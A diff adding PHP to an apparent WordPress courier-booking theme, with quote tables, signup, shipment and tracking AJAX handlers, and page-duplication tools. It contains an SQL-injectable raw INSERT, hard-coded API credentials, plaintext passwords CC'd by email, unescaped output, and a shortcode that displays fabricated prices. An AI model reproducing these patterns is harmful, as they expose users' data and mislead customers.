+		$courier_quote=$resultcatdata->data;
+		if( isset($courier_quote['0'] )){
+
+		?>
+		<div id="tabs-content new">
+			<div id="tab1" class="tab-content">
+				<table class="price-table" border="0">
+					<tbody>
+						<tr>
+							<td class="table_heading" width="18%"><h5>Carrier</h5></td>
+							<td class="table_heading" width="20%"><h5>Estimated Delivery Time - Business days ONLY </h5></td>
+							<td class="table_heading"><h5>Weight</h5></td>
+							<td class="table_heading"><h5>Calculated Freight Charge<br><small>Calculated Fuel Charge</small></h5></td>
+							<td class="table_heading"><h5>Insurance Category<br><small>Insurance Amt</small></h5></td>
+							<td class="table_heading"><h5>Pick Up Cut Off Time</h5></td>
+							<td class="table_heading"></td>
+						</tr>
+						<?php
+						//$courier_quote = sort($courier_quote);
+						$keys = array_column($courier_quote, 'CalculatedFreightCharge');
+						array_multisort($keys, SORT_ASC, $courier_quote);
+
+							foreach ($courier_quote as $quote_data) {
+								$totalWidth = $quote_data->CalculatedFreightCharge;
+
+								if(30 < $totalWidth){
+									$percentage = $third_case;
+								}
+
+								if($totalWidth > 20  and $totalWidth < 30){
+									$percentage = $second_case;
+								}
+
+								if(20 > $totalWidth){
+									$percentage = $first_case;
+								}
+
+								if( $percentage ) {
+									$new_width = ($percentage / 100) * $totalWidth;
+									$new_price = $totalWidth + $new_width;
+									$new_pricee = round($new_price,2);
+								}
+								else{
+									$new_pricee = $quote_data->CalculatedFreightCharge;
+								}
+
+								if($new_pricee){
+									$margin_newprice = $new_pricee;
+								}
+								$array_secondstep=array(
+									'CalculatedFreightCharge' =>$margin_newprice,
+									'percentage' => $percentage,
+									'oldcharges' => $quote_data->CalculatedFreightCharge,
+									'CalculatedFuelCharge' => $quote_data->CalculatedFuelCharge,
+									'ETA' => $quote_data->ETA,
+									'PickupCutOffTime' => $quote_data->PickupCutOffTime,
+									'RateCardCode' => $quote_data->RateCardCode,
+									'RateCardDescription' => $quote_data->RateCardDescription,
+									'Weight' => $quote_data->Weight,
+									'InsuranceCategory' => $quote_data->InsuranceCategory,
+									'InsuranceAmt' => $quote_data->InsuranceAmt,
+									'fromSuburb' => $FromAddress,
+									'fromPostcode' => $FromAddress_postcode,
+									'fromstatecode' => $FromAddress_statecode,
+									'toSuburb' => $ToAddress,
+									'toPostcode' => $ToAddress_postcode,
+									'tostatecode' => $ToAddress_statecode,
+									'ToAddress_Building' => $ToAddress_Building,
+									'FromAddress_Building' => $FromAddress_Building,
+								);
+								$data_second_step = json_encode($array_secondstep);
+							?>
+								<tr>
+									<td style="display:none;" class="custom_data_sceond_cookie"><?php echo $data_second_step; ?></td>
+
+									<td class="courier-logo" width="18%"><img src="<?php echo site_url()?>/wp-content/uploads/2020/08/couriersp-logo1.png" /></td>
+
+									<td class="courier-title" width="20%">
+										<h4><?php echo $quote_data->RateCardDescription; ?> <small><?php echo $quote_data->ETA; ?></small></h4>
+									</td>
+
+									<td class="Weight"><?php echo $quote_data->Weight; ?> Kg(s)</td>
+
+									<td class="courier-price"> $<?php echo $margin_newprice; ?>
+										<span><?php echo $quote_data->CalculatedFuelCharge; ?> </span>
+									</td>
+
+									<td class="yes">
+										<div class="tooltip">
+											<i class="fa fa-info-circle " aria-hidden="true"  ></i>
+											<span class="tooltiptext">The INS2 doesn't mean anything to the customer, can we change this to ‘Insurance Coverage’ or Something? Also does that mean ‘coverage is up to $2000’.</span>
+										</div>
+										<?php echo $quote_data->InsuranceCategory; ?><br>
+										<?php echo $quote_data->InsuranceAmt; ?>
+									</td>
+
+									<td class="info">
+										<div style="display:none;" class="tooltip">
+											<i class="fa fa-info-circle " aria-hidden="true"  ></i>
+											<span class="tooltiptext">Tooltip text</span>
+										</div>
+										<?php echo $quote_data->PickupCutOffTime; ?>
+									</td>
+
+									<td class="buy-bttn">
+										<a class="bttn"  >Buy Now <div style='display:none; height:40px;' class="custom_loader"><img src="<?php echo site_url()?>/wp-content/uploads/2020/09/loading.gif"></div></a>
+									</td>
+								</tr>
+							<?php } ?>
+					</tbody>
+				</table>
+			</div>
+		</div>
+	<?php }
+	else{
+		echo "<div class='custom_no_data'><p>No data found. Please go to package page and fill correct location</p><div class='button_lonk'><a href='".site_url()."'/package-details/'>Package Details</a></div></div>'";}
+	}
+	else{
+		echo "<div class='custom_no_data'><p>Invalid Results. please Fill complete Form.</p><div class='button_lonk'><a href='".site_url()."'/package-details/'>Package Details</a></div></div>'";
+	}
+	exit;
+}
+
+/* This function flll the user information  for sent the pasal  */
+add_action("wp_ajax_shipment_user_info", "shipment_user_info");
+add_action("wp_ajax_nopriv_shipment_user_info", "shipment_user_info");
+function  shipment_user_info(){
+	global $wpdb;
+
+	parse_str($_POST['list'], $data);
+
+	$select_quotes = $_POST['select_quotes'];
+	$select_quotes = stripslashes($select_quotes);
+	$result_select_quotes = json_decode($select_quotes);
+    $pickupEmail = $data['user_Email'];
+	$pickupFirstName = $data['userFirstName'];
+	$pickupLastName = $data['userLastName'];
+
+	if( !empty($pickupFirstName) and !empty($pickupLastName)  and !empty($pickupEmail) ){
+
+		$the_user = get_user_by('email', $pickupEmail);
+		$the_user_id = $the_user->ID;
+		$password = wp_generate_password(10, false, false);
+		if($the_user_id){
+			echo ' <a href="'.site_url().'/my-account" class="userinfo_btn">User Mail-ID Exist please login</a>';
+		}
+		else{
+
+			$user_info = array(
+				 "user_pass"     => $password,
+				 "user_login"    => $pickupEmail,
+				 "user_nicename" => $pickupFirstName,
+				 "user_email"    => $pickupEmail,
+				 "display_name"  => $pickupFirstName,
+				 "first_name"    => $pickupFirstName,
+				 "last_name"     => $pickupLastName,
+			);
+
+			$insert_user_result = wp_insert_user( $user_info );
+			$the_user = get_user_by('email', $pickupEmail);
+			$the_user_id = $the_user->ID;
+			wp_set_current_user($the_user_id);
+			wp_set_auth_cookie($the_user_id);
+
+			if($insert_user_result) {
+				$to = $pickupEmail;
+				$subject = "User Account Info";
+
+				$message = get_field("user_registration_email_template", "option");
+				$message = str_replace( "{username}", $the_user->user_login , $message );
+				$message = str_replace( "{password}", $password , $message );
+
+				$user = new WP_User( (int) $the_user_id );
+				$adt_rp_key = get_password_reset_key( $user );
+				$user_login = $user->user_login;
+				$rp_link = '<a href="' . network_site_url("wp-login.php?action=rp&key=$adt_rp_key&login=" . rawurlencode($user_login), 'login') . '">' . network_site_url("wp-login.php?action=rp&key=$adt_rp_key&login=" . rawurlencode($user_login), 'login') . '</a>';
+				$message = str_replace( "{reset_password_link}", $rp_link , $message );
+				$headers = array();
+				$headers[] = "Cc: admin@webspero.com";
+
+				wp_mail($to,$subject,$message,$headers);
+				/*----email end-----*/
+				$url = site_url()."/shipment-details-page";
+				echo "<div class='shipement_details_array' style='display:none;'>".$data_pass."</div><div class='consignmentCode custom_green'>New record created successfully</div>";
+				echo "<div class='url' style='display:none;'>".$url."</div>";
+			}
+			else {
+				echo "Error: " . $sql . "<br>" . $conn->error;
+			}
+		}
+	}
+	exit;
+}
+
+/* This function used to buy button fire by ajax when user select best courier service */
+add_action("wp_ajax_buy_button", "buy_button");
+add_action("wp_ajax_nopriv_buy_button", "buy_button");
+function buy_button(){
+	$url = site_url()."/shipment-details-page";
+	echo $url;
+	exit;
+}
+
+/* this function fill the additional information like term police etc */
+add_action("wp_ajax_additional", "additional");
+add_action("wp_ajax_nopriv_additional", "additional");
+function additional(){
+	$url = site_url()."/payment-details";
+	echo $url;
+	exit;
+}
+
+/*-----this function save the shipping info database insert--------*/
+add_action("wp_ajax_shipping_database", "shipping_database");
+add_action("wp_ajax_nopriv_shipping_database", "shipping_database");
+function shipping_database(){
+	global $wpdb;
+
+	parse_str($_POST['shipping_details'], $data);
+	$ToAddress = $_COOKIE["ToAddress"];
+	$ToAddress_Building = $_COOKIE["ToAddress_Building"];
+	$FromAddress = $_COOKIE["FromAddress"];
+	$FromAddress_Building = $_COOKIE["FromAddress_Building"];
+	$Item = $_COOKIE["Item"];
+	$arr = explode(",",$Item);
+	$quantity = $_COOKIE["quantity"];
+	$arr_quantity = explode(",",$quantity);
+	$Weight_kg = $_COOKIE["Weight_kg"];
+	$arr_Weight_kg = explode(",",$Weight_kg);
+	$Length_kg = $_COOKIE["Length_kg"];
+	$arr_Length_kg = explode(",",$Length_kg);
+	$Width_cm = $_COOKIE["Width_cm"];
+	$arr_Width_cm = explode(",",$Width_cm);
+	$Height_cm = $_COOKIE["Height_cm"];
+	$arr_Height_cm = explode(",",$Height_cm);
+
+	/*----Select_quotes-----*/
+	$select_quotes = $_COOKIE["select_quotes"];
+	$select_quotes = stripslashes($select_quotes);
+	$result_select_quotes = json_decode($select_quotes);
+	$RateCardCode = $result_select_quotes->RateCardCode;
+	$InsuranceCategory = $result_select_quotes->InsuranceCategory;
+
+	/*--------date------*/
+	$date=date("Y-m-d h:i A");
+	//print_r($data);
+	$pickupFirstName= $data['pickupFirstName'];
+	$pickupLastName= $data['pickupLastName'];
+	$pickupCompanyName= $data['pickupCompanyName'];
+	$pickupEmail= $data['pickupEmail'];
+	$pickupAddress1= $data['pickupAddress1'];
+	$pickupAddress2= $data['pickupAddress2'];
+	$pickupSuburb= $data['pickupSuburb'];
+	$pickupState= $data['pickupState'];
+	$pickupPostcode= $data['pickupPostcode'];
+	$pickupPhone= $data['pickupPhone'];
+
+	$destinationFirstName= $data['destinationFirstName'];
+	$destinationLastName= $data['destinationLastName'];
+	$destinationCompanyName= $data['destinationCompanyName'];
+	$destinationEmail= $data['destinationEmail'];
+	$destinationAddress1= $data['destinationAddress1'];
+	$destinationAddress2= $data['destinationAddress2'];
+	$destinationSuburb= $data['destinationSuburb'];
+	$destinationState= $data['destinationState'];
+	$destinationPostcode= $data['destinationPostcode'];
+	$destinationPhone= $data['destinationPhone'];
+	$user_id= $data['user_id'];
+
+	if($ToAddress_Building == '1'){
+		$Toaddress="true";
+	}
+	else{
+		$Toaddress="false";
+	}
+
+	if($FromAddress_Building == '1'){
+		$Fromaddress="true";
+	}
+	else{
+		$Fromaddress="false";
+	}
+
+	/*---------start add Item-----------*/
+	$itemssArray  = array();
+	$j = 0;
+	foreach ($arr as $Item) {
+		$items_array = array (
+			'quantity' => $arr_quantity[$j],
+			'length' => $arr_Length_kg[$j],
+			'height' => $arr_Height_cm[$j],
+			'width' => $arr_Weight_kg[$j],
+			'physicalWeight' => $arr_Width_cm[$j],
+			'Item_select' => $arr[$j],
+		);
+		$itemssArray[] = $items_array;
+	    $j++;
+	}
+	/*---------end add Item-----------*/
+
+	/*-----start complete array------*/
+	$data_info = array (
+	  'pickupDeliveryChoiceID' => NULL,
+	  'pickupFirstName' => $pickupFirstName,
+	  'pickupLastName' => $pickupLastName,
+	  'pickupCompanyName' => $pickupCompanyName,
+	  'pickupEmail' => $pickupEmail,
+	  'pickupAddress1' => $pickupAddress1,
+	  'pickupAddress2' => $pickupAddress2,
+	  'pickupSuburb' => $pickupSuburb,
+	  'pickupState' => $pickupState,
+	  'pickupPostcode' => $pickupPostcode,
+	  'pickupPhone' => $pickupPhone,
+	  'pickupIsBusiness' => $Fromaddress,
+	  'destinationDeliveryChoiceID' => NULL,
+	  'destinationFirstName' => $destinationFirstName,
+	  'destinationLastName' => $destinationLastName,
+	  'destinationCompanyName' => $destinationCompanyName,
+	  'destinationEmail' => $destinationEmail,
+	  'destinationAddress1' => $destinationAddress1,
+	  'destinationAddress2' => $destinationAddress2,
+	  'destinationSuburb' => $destinationSuburb,
+	  'destinationState' => $destinationState,
+	  'destinationPostcode' => $destinationPostcode,
+	  'destinationPhone' => $destinationPhone,
+	  'destinationIsBusiness' =>  $Toaddress,
+	  'contactFirstName' => $pickupFirstName,
+	  'contactLastName' => $pickupLastName,
+	  'contactCompanyName' => $pickupCompanyName,
+	  'contactEmail' => $pickupEmail,
+	  'contactAddress1' => $pickupAddress1,
+	  'contactAddress2' => $pickupAddress2,
+	  'contactSuburb' => $pickupSuburb,
+	  'contactState' => $pickupState,
+	  'contactPostcode' => $pickupPostcode,
+	  'contactPhone' => $pickupPhone,
+	  'contactIsBusiness' => $Fromaddress,
+	  'referenceNumber' => 'abc-123',
+	  'termsAccepted' => 'true',
+	  'dangerousGoods' => 'false',
+	  'rateCardId' => $RateCardCode,
+	  'specialInstruction' => 'Leave on front door.',
+	  'isATL' => 'false',
+	  'readyDateTime' => $date,
+	  'InsuranceCategory' => $InsuranceCategory,
+	  'items' => $itemssArray,
+	);
+
+	$data_pass = json_encode($data_info);
+	/*------end complete array--------*/
+
+
+	$the_user = get_user_by('email', $pickupEmail);
+	$the_user_id = $the_user->ID;
+	$dataa = $wpdb->query("INSERT INTO shipment_details (shipment_id,shipment_pickupFirstName,shipment_pickupLastName,shipment_pickupCompanyName,shipment_pickupEmail,shipment_pickupAddress1,shipment_pickupAddress2,shipment_pickupSuburb,shipment_pickupState,shipment_pickupPostcode,shipment_pickupPhone,shipment_destinationFirstName,shipment_destinationLastName,shipment_destinationCompanyName,shipment_destinationEmail,shipment_destinationAddress1,shipment_destinationAddress2,shipment_destinationSuburb,shipment_destinationState,shipment_destinationPostcode,shipment_destinationPhone,Select_quotes,Shipping_json,Order_status,user_account_id) VALUES (NULL,'$pickupFirstName','$pickupLastName','$pickupCompanyName','$pickupEmail','$pickupAddress1','$pickupAddress2','$pickupSuburb','$pickupState','$pickupPostcode','$pickupPhone','$destinationFirstName','$destinationLastName','$destinationCompanyName','$destinationEmail','$destinationAddress1','$destinationAddress2','$destinationSuburb','$destinationState','$destinationPostcode','$destinationPhone','$select_quotes','$data_pass','1','$the_user_id')");
+
+	if($dataa) {
+		$url = site_url()."/additional-information-page";
+		echo "<div class='shipement_details_array' style='display:none;'>".$data_pass."</div><div class='consignmentCode custom_green'>New Shipping Information Inserted</div>";
+		echo "<div class='url' style='display:none;'>".$url."</div>";
+	}
+	exit;
+}
+
+/* This function used for tracking parsal */
+add_action("wp_ajax_tracking_parsal", "tracking_parsal");
+add_action("wp_ajax_nopriv_tracking_parsal", "tracking_parsal");
+function tracking_parsal() {
+
+	parse_str($_POST['tracking'], $data);
+	$track=$data['trackingid'];
+
+	/*----------Start  tracking courier api----------*/
+	$url = 'https://api-test.couriersplease.com.au/v1/domestic/locateParcel?trackingCode='.$track;
+	$curl = curl_init();
+	$username = '113135024';
+	$password = '2D4AD91FE8CAEA0176B14CB09C9B6B7C2C3F55890F7870704F26CC1B43CD9892';
+	$base64= base64_encode("$username:$password");
+
+	curl_setopt_array($curl, array(
+		CURLOPT_URL => $url,
+		CURLOPT_RETURNTRANSFER => true,
+		CURLOPT_ENCODING => "",
+		CURLOPT_MAXREDIRS => 10,
+		CURLOPT_TIMEOUT => 30,
+		CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+		CURLOPT_CUSTOMREQUEST => "GET",
+		CURLOPT_HTTPHEADER => array(
+				"accept: application/json",
+				"cache-control: no-cache",
+				"content-type: application/json",
+				"host: api-test.couriersplease.com.au",
+				"authorization: Basic ". $base64
+		),
+	));
+
+	$result = curl_exec($curl);
+	$resultcatdata=json_decode($result);
+	$check_con=$resultcatdata->data;
+	$data_check=$check_con->consignmentInfo;
+	$data_check=$data_check[0]->itemsCoupons;
+	$data_check=$data_check[0]->trackingInfo;
+	$data_check=$data_check[0]->action;
+
+	echo $new_data = "<div class='custom_tracking'>
+						<div class='tracking_info'>".$data['trackingid']."</div>
+						<table>
+							<tr>
+								<td>".$data['trackingid']."</td>
+								<td></td>
+								<td>".$data_check."</td>
+								<td></td>
+							</tr>
+						</table>
+					</div>";
+	/*----------end courier api----------*/
+
+exit;
+}
+
+
+add_action("template_redirect", "send_to_page_city");
+function send_to_page_city() {
+
+
+	global $wp_query;
+	$query = $wp_query->query;
+
+	if( isset( $query['city_2'] ) ) {
+		return;
+	}
+
+	global $post;
+    $post_slug = $post->post_name;
+    $post_type = $post->post_type;
+
+	if( $post_type == "city" && $post_slug  == "hobart-draft" ) {
+		wp_safe_redirect( site_url('hobart') );
+		exit;
+	}
+	if( $post_type == "city" && $post_slug  == "darwin-draft" ) {
+		wp_safe_redirect( site_url('darwin') );
+		exit;
+	}
+	if( $post_type == "city" && $post_slug  == "new-castle-draft" ) {
+		wp_safe_redirect( site_url('castle') );
+		exit;
+	}
+	if( $post_type == "city" && $post_slug  == "adelaide-draft" ) {
+		wp_safe_redirect( site_url('adelaide') );
+		exit;
+	}
+	if( $post_type == "city" && $post_slug  == "perth-draft" ) {
+		wp_safe_redirect( site_url('perth') );
+		exit;
+	}
+	if( $post_type == "city" && $post_slug  == "canberra-draft" ) {
+		wp_safe_redirect( site_url('canberra') );
+		exit;
+	}
+	if( $post_type == "city" && $post_slug  == "sydney-draft" ) {
+		wp_safe_redirect( site_url('sydney') );
+		exit;
+	}
+	if( $post_type == "city" && $post_slug  == "melbourne-draft" ) {
+		wp_safe_redirect( site_url('melbourne') );
+		exit;
+	}
+	if( $post_type == "city" && $post_slug  == "brisbane-draft" ) {
+		wp_safe_redirect( site_url('brisbane') );
+		exit;
+	}
+
+}
+
+function category_page_settings() {
+    register_taxonomy_for_object_type('category', 'page');
+
+	register_taxonomy( 'freights_city_type', 'freights', array(
+        'label'        => __( 'City Types', 'textdomain' ),
+        'hierarchical' => true,
+        'show_admin_column' => true,
+    ) );
+}
+
+add_action( 'init', 'category_page_settings' );
+
+
+add_shortcode("CURRENT_CITY", "frieght_city_name");
+function frieght_city_name( $atts, $content = null ) {
+	ob_start();
+
+	$city_name = "";
+
+	if( get_post_type() == "freights" ) {
+		$city_name = get_field( "current_city_name" );
+		$city_name = $city_name ? $city_name : get_the_title();
+	}
+
+	echo $city_name;
+	$content = ob_get_contents();
+	ob_end_clean();
+	return $content;
+}
+
+add_shortcode("PARENT_CITY", "parent_city_name");
+function parent_city_name( $atts, $content = null ) {
+	ob_start();
+
+	$city_name = "";
+
+	if( get_post_type( get_the_ID() ) == "freights" ) {
+		$post_id = get_the_ID();
+		$post = get_post( $post_id );
+
+		if( isset( $post->post_parent ) && $post->post_parent ) {
+			$city_name = get_field( "parent_city_name", $post_id );
+			$city_name = $city_name ? $city_name : get_field( "current_city_name", $post->post_parent );
+			$city_name = $city_name ? $city_name : get_the_title( $post->post_parent );
+		}
+	}
+	echo $city_name;
+	$content = ob_get_contents();
+	ob_end_clean();
+	return $content;
+}
+
+add_action("template_redirect", "test_duplication");
+function test_duplication() {
+
+	if( isset ( $_GET['test_duplication'] ) ){
+		return;
+		global $wpdb;
+
+		$post_id = 19849;
+		$post_id = 21461;
+
+		$post_parent = 0;
+		$post = get_post($post_id);
+		$post_status = "publish";
+		$parent_city_name = "";
+
+		//$post_parent = 0;
+		//$parent_city_name = "";
+
+		$main_cities_to_add = array(
+			"albury",
+			"ballarat",
+			"melbourne",
+			"perth",
+			"tamworth",
+			"cairns",
+			"brisbane",
+			"townsville",
+			"newcastle",
+			"adelaide",
+			"hobart",
+			"darwin",
+		);
+
+		$main_cities_to_add = array(
+			/*"broke",
+			"brooker",
+			"albury",
+			"ballarat",
+			"melbourne",
+			"sydney",
+			"perth",
+			"brokenhill",
+			"tamworth",
+			"bendigo",
+			"mildura",
+			"warrnambool",
+			"cairns",
+			"cargo",
+			"dubbo",
+			"brisbane",
+			"townsville",
+			"adelaide",
+			"geraldton",
+			"canberra",
+			"darwin",
+			"collector",
+			"narrabri",
+			"newcastle",
+			"geelong",
+			"shepparton",
+			"mackay",
+			"toowoomba",
+			"price",
+			"kalgoorlie",
+			"karratha",
+			"porthedland",
+			"alicesprings",
+			"wangaratta",
+			"bundaberg",
+			"rockhampton",
+			"broome",
+			"driver",
+			"coffsharbour",
+			"portmacquarie",
+			"hobart",
+			"lismore",
+			"waggawagga",
+			"wollongong",
+			"goondiwindi",
+			"mountgambier",
+			"berkeley",
+			"cardiff",
+			"hamilton",
+			"liverpool",
+			"norway",
+			"portland",
+			"southampton",
+			"sydenham",
+			"tempe",
+			"texas",
+			"toronto",
+			"wellington",
+			"windsor",
+			"woodstock",
+			"dandenong",
+			"derby",
+			"edi",
+			"haven",
+			"houston",
+			"hunter",
+			"melbourneairport",
+			"officer",
+			"peterborough",
+			"research",
+			"sale",
+			"speed",
+			"swanhill",
+			"tullamarine",
+			"bogie",
+			"cambridge",
+			"columbia",
+			"conway",
+			"edmonton",
+			"egypt",
+			"ipswich",
+			"mexico",
+			"miles",
+			"bunbury",
+			"dublin",
+			"edinburgh",
+			"fox",
+			"lock",
+			"queenstown",
+			"dover",
+			"launceston",
+			"sheffield",
+			"tunnel",
+			"dayton",
+			"denmark",
+			"onslow",
+			"city",
+			"aberdeen",
+			"nelson",
+			"tacoma",
+			"bradford",
+			"buffalo",
+			"dallas",
+			"denver",
+			"horn",
+			"miami",
+			"oxford",
+			"northampton",*/
+		);
+
+		$main_cities_to_add_done = array(
+			"albury",
+			"ballarat",
+			"melbourne",
+			"perth",
+			"tamworth",
+			"cairns",
+			"brisbane",
+			"townsville",
+			"newcastle",
+			"adelaide",
+			"hobart",
+			"darwin",
+		);
+
+
+		if ( ! is_admin() ) {
+			require_once( ABSPATH . 'wp-admin/includes/post.php' );
+		}
+		foreach( $main_cities_to_add as $city ) {
+
+			$post_title = ucfirst($city);
+
+			if( post_exists($post_title, '', '', 'freights') ) {
+				continue;
+			}
+
+			$args = array(
+				'comment_status' => $post->comment_status,
+				'ping_status' => $post->ping_status,
+				'post_author' => get_current_user_id(),
+				'post_content' => $post->post_content,
+				'post_excerpt' => $post->post_excerpt,
+				//'post_name' => $post->post_name,
+				'post_parent' => $post_parent,
+				'post_password' => $post->post_password,
+				'post_status' => $post_status,
+				'post_title' => $post_title,
+				'post_type' => $post->post_type,
+				'to_ping' => $post->to_ping,
+				'menu_order' => $post->menu_order,
+			);
+
+			$new_post_id = wp_insert_post($args);
+
+			$taxonomies = get_object_taxonomies($post->post_type);
+			if (!empty($taxonomies) && is_array($taxonomies)):
+				foreach ($taxonomies as $taxonomy) {
+					$post_terms = wp_get_object_terms($post_id, $taxonomy, array('fields' => 'slugs'));
+					wp_set_object_terms($new_post_id, $post_terms, $taxonomy, false);
+				}
+			endif;
+
+			$post_meta_infos = $wpdb->get_results("SELECT meta_key, meta_value FROM $wpdb->postmeta WHERE post_id=$post_id");
+			if (count($post_meta_infos)!=0) {
+
+				$sql_query = "INSERT INTO $wpdb->postmeta (post_id, meta_key, meta_value) ";
+				foreach ($post_meta_infos as $meta_info) {
+					$meta_key = sanitize_text_field($meta_info->meta_key);
+					$meta_value = addslashes($meta_info->meta_value);
+					$sql_query_sel[]= "SELECT $new_post_id, '$meta_key', '$meta_value'";
+				}
+				$sql_query.= implode(" UNION ALL ", $sql_query_sel);
+				$wpdb->query($sql_query);
+			}
+
+			update_post_meta( $new_post_id, "current_city_name", $post_title );
+		}
+
+
+		exit;
+	}
+
+	if( isset ( $_GET['test_duplication_child'] ) ){
+		return;
+		global $wpdb;
+
+		$post_id = 20564;
+		$pcn = "Townsville";
+		$post_parent_id = 21456;
+
+		$post_parent = 0;
+		$post = get_post($post_id);
+		$post_status = "publish";
+
+		$parent_city_name = $pcn." to ";
+		//$parent_city_name = "";
+
+		$main_cities_to_add = array(
+			"albury",
+			"ballarat",
+			"melbourne",
+			"sydney",
+			"perth",
+			"tamworth",
+			"cairns",
+			"brisbane",
+			"townsville",
+			"newcastle",
+			"adelaide",
+			"hobart",
+			"darwin",
+		);
+
+		if ( ! is_admin() ) {
+			require_once( ABSPATH . 'wp-admin/includes/post.php' );
+		}
+
+		foreach( $main_cities_to_add as $city ) {
+
+			if( strtolower($city) == strtolower($pcn) ) {
+				continue;
+			}
+
+			$post_title = ucwords($parent_city_name.$city);
+			$post_name = strtolower("freight-to-".$city);
+
+			if( post_exists($post_title, '', '', 'freights') ) {
+				continue;
+			}
+
+			$args = array(
+				'comment_status' => $post->comment_status,
+				'ping_status' => $post->ping_status,
+				'post_author' => get_current_user_id(),
+				'post_content' => $post->post_content,
+				'post_excerpt' => $post->post_excerpt,
+				'post_name' => $post_name,
+				'post_parent' => $post_parent_id,
+				'post_password' => $post->post_password,
+				'post_status' => $post_status,
+				'post_title' => $post_title,
+				'post_type' => $post->post_type,
+				'to_ping' => $post->to_ping,
+				'menu_order' => $post->menu_order,
+			);
+
+			echo $new_post_id = wp_insert_post($args); echo "$post_title <br>";
+
+			$taxonomies = get_object_taxonomies($post->post_type);
+			if (!empty($taxonomies) && is_array($taxonomies)):
+				foreach ($taxonomies as $taxonomy) {
+					$post_terms = wp_get_object_terms($post_id, $taxonomy, array('fields' => 'slugs'));
+					wp_set_object_terms($new_post_id, $post_terms, $taxonomy, false);
+				}
+			endif;
+
+			$post_meta_infos = $wpdb->get_results("SELECT meta_key, meta_value FROM $wpdb->postmeta WHERE post_id=$post_id");
+			if (count($post_meta_infos)!=0) {
+
+				$sql_query = "INSERT INTO $wpdb->postmeta (post_id, meta_key, meta_value) ";
+				foreach ($post_meta_infos as $meta_info) {
+					$meta_key = sanitize_text_field($meta_info->meta_key);
+					$meta_value = addslashes($meta_info->meta_value);
+					$sql_query_sel[]= "SELECT $new_post_id, '$meta_key', '$meta_value'";
+				}
+				$sql_query.= implode(" UNION ALL ", $sql_query_sel);
+				$wpdb->query($sql_query);
+			}
+
+			update_post_meta( $new_post_id, "current_city_name", ucwords($city) );
+			update_post_meta( $new_post_id, "parent_city_name", ucwords($pcn) );
+		}
+
+
+		exit;
+	}
+
+	if( isset ( $_GET['importdepots'] ) ){
+		return;
+		$newlocation = get_stylesheet_directory().'/import/tnt.csv';
+
+		$delimiter=',';		$header = NULL;		$data = array();
+		if (($handle = fopen($newlocation, 'r')) !== FALSE) {
+			$i=0;
+
+			while (($row = fgetcsv($handle, 0, $delimiter)) !== FALSE) {
+				if(!$header) {
+					$header = $row;
+				}
+				else {
+					$data[] = array_combine($header, $row);
+				}
+			}
+			fclose($handle);
+
+			$post_type = 'depots';
+			$post_status = 'publish';
+
+			foreach($data as $index => $row) {
+
+				$post_args = array( 'post_title' => $row['Depot Name'], 'post_type' => $post_type, 'post_status' => $post_status );
+				$listing_id = wp_insert_post($post_args);
+
+				update_post_meta( $listing_id, 'depot_street_name', $row['Text'] );
+				update_post_meta( $listing_id, 'depot_suburb', $row['Suburb'] );
+				update_post_meta( $listing_id, 'depot_state', $row['State'] );
+				update_post_meta( $listing_id, 'depot_short_state', $row['ShortS'] );
+				update_post_meta( $listing_id, 'depot_postcode', $row['Postcode'] );
+
+				wp_set_object_terms( $listing_id, 36, 'couriers' );
+
+				echo $row['Depot Name']; echo "<br>";
+			}
+
+			echo "<pre>"; print_r($data); echo "</pre>";
+			exit;
+		}
+	}
+
+	if( isset ( $_GET['setdepotcontent'] ) ){
+		return;
+		$args = array('post_type' => "depots", 'posts_per_page' => -1, 'post_status' => 'publish', 'orderby' => array("title" => "ASC") );
+
+		$query = new WP_Query($args );
+
+		if ( $query->have_posts() ) {
+			$listings = $query->posts;
+
+			foreach( $listings as $depot ) {
+
+				$content = '
+				<p>Compare & Book Couriers in [Suburb], [StateS] with Fast Courier</p>
+				Fast Courier has partnered with [Courier] to offer you competitive quote comparisons all in one place!</p>
+				<p>Our services allow you to book couriers of freight anywhere in [state]. You can organise a free collection with [Courier] or drop off your package at [Depot_Name]. </p>
+				<p>[Depot_Name] address is [street_name], [Suburb], [StateS], [postcode]. Order a booking online with free collection from your home / business or alternatively book online and drop your package at [Depot_Name]. Whichever options you choose, we are here to support all your freight and logistics needs.</p>
+				<p>Book your next courier with confidence using Fast Courier’s online booking technology!</p>';
+
+				$depot_id = $depot->ID;
+				$depot_name = $depot->post_title;
+				$couriers = get_the_terms( $depot_id, "couriers" );
+				$courier_name = "";
+				if($couriers) {
+					$courier_object = $couriers[0];
+					$courier_name = $courier_object->name;
+				}
+
+				$depot_street_name = get_field("depot_street_name", $depot_id);
+				$depot_suburb = get_field("depot_suburb", $depot_id);
+				$depot_state = get_field("depot_state", $depot_id);
+				$depot_short_state = get_field("depot_short_state", $depot_id);
+				$depot_postcode = get_field("depot_postcode", $depot_id);
+				$depot_map_address = get_field("depot_map_address", $depot_id);
+
+				$content = str_replace( "[Depot_Name]", $depot_name, $content );
+				$content = str_replace( "[Suburb]", $depot_suburb, $content );
+				$content = str_replace( "[StateS]", $depot_short_state, $content );
+				$content = str_replace( "[Courier]", $courier_name, $content );
+				$content = str_replace( "[street_name]", $depot_street_name, $content );
+				$content = str_replace( "[postcode]", $depot_postcode, $content );
+				$content = str_replace( "[state]", $depot_state, $content );
+
+				$post_content = $content;
+				echo $depot_id;echo "<br>";
+				delete_post_meta( $depot_id, "depot_text" );
+				update_post_meta( $depot_id, "depot_seo_location_text", $content );
+
+			}
+		}
+
+		exit;
+	}
+}
+
+add_shortcode("RANDOMPRICE", "randomprice_fn");
+function randomprice_fn( $atts, $content = null ) {
+	ob_start();
+
+	$a = shortcode_atts( array(
+        'number' => 1,
+    ), $atts );
+
+	$index = $a['number'];
+	$post_id = get_the_ID();
+
+	$min_price = 11 + $index;
+
+	$number = $min_price * get_the_ID() * get_the_ID() * get_the_ID() * 72 ; // 72 is random number
+	$number = substr($number, -5);   // Get last 5 digits to randomize
+	for( $i = 0; $i < 50; $i++ ) {
+
+		if( $number > 19 ) {
+			$number = $number / 7; // 7 is random number
+		}
+
+		else if( $number < 12 ) {
+			$number = $number * 22; // 22 is random number
+		}
+
+		else if( $number >= $min_price && $number <= 19 ) {
+			break;
+		}
+	}
+
+	$number = number_format( $number, 2 );
+	echo "$ ".$number;
+
+	$content = ob_get_contents();
+	ob_end_clean();
+	return $content;
+}
+
+add_shortcode("FREIGHTCITY", "freightcity_fn");
+function freightcity_fn( $atts, $content = null ) {
+	ob_start();
+
+	$a = shortcode_atts( array(
+        'city' => 1,
+    ), $atts );
+
+	$index = $a['city'];
+
+	$cities = get_field( 'frieght_indexing', "option" );
+
